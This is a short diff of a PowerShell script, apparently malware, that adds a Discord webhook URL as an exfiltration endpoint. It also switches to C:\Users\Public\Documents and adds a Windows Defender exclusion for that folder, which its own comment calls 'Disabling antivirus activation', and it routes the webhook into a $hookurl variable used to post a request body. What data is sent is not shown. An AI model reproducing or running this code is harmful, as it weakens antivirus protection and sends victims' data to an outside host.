@@ -1,3 +1,4 @@
+$db = 'https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC'
 Set-Location C:\Users\Public\Documents
 
 Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation
@@ -49,7 +50,7 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-$dc = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
+
 $hookurl = "$dc"
 
 $Body = @{
